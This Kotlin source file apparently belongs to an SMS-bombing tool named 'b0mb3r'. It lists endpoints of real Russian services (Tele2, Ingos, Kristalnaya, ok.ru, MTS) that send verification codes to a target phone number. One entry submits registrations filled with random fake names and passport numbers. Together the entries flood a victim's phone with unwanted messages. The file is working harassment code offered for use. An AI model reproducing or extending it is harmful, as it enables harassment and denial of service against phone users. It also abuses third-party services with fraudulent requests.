package com.y9san9.b0mb3r.service

import com.y9san9.b0mb3r.utils.randomEmail
import com.y9san9.b0mb3r.utils.randomRussian
import com.y9san9.b0mb3r.utils.text
import kotlin.random.Random


val servicesInitializer: MutableList<Service>.() -> Unit = {
    /**
     *  Service example
     *  Checked 28.06.20. Only 70000000000 format available
     *  Define arguments as constant or inside lambda if it requires number
     */
    /**
    service(method = Method.POST, data = hashMapOf("sender" to "Tele2")) { phone ->
        // Define url
        url("https://msk.tele2.ru/api/validation/number/${phone.code(7)}")

        // Define params
        params(
            "first" to "value",
            "second" to true
        )

        // Define body
        data(hashMapOf("sender" to "Tele2"))

        // Disable service if number incorrect
        disable(!listOf(7, 8).contains(phone.code))
        // or enable if number correct, by default service always enabled
        enable(listOf(7, 8).contains(phone.code))

        // Check if request success
        validate {
            it?.statusCode == 200
        }
    }
     */

    service {
        url("https://msk.tele2.ru/api/validation/number/${it.code(7)}")
        params("sender" to "Tele2")
        enable(listOf(7, 8).contains(it.code))
    }

    service("https://www.ingos.ru/api/v1/lk/auth/register/fast/step2"){
        headers("Referer" to "https://www.ingos.ru/cabinet/registration/personal")
        body(mapOf("Birthday" to "1986-07-10T07:19:56.276+02:00",
            "DocIssueDate" to "2004-02-05T07:19:56.276+02:00",
            "DocNumber" to Random.nextInt(500000, 999999),
            "DocSeries" to Random.nextInt(5000, 9999),
            "FirstName" to randomRussian(),
            "Gender" to "M",
            "LastName" to randomRussian(),
            "SecondName" to randomRussian(),
            "Phone" to it.text,
            "Email" to randomEmail()
        ))
    }

    service("https://kristalnaya.ru/ajax/ajax.php?action=send_one_pas_reg"){ phone ->
        val masked = phone.mask("+# (###) ###-##-##")
        params("data" to """{"phone":"$masked"}""")
        disable(masked == null)
        validate { it?.text?.contains("JSON error") == false }
    }

    service("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone"){
        params("st.r.phone" to "+$it")
    }

    service("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code"){
        params("msisdn" to it.text)
    }

}
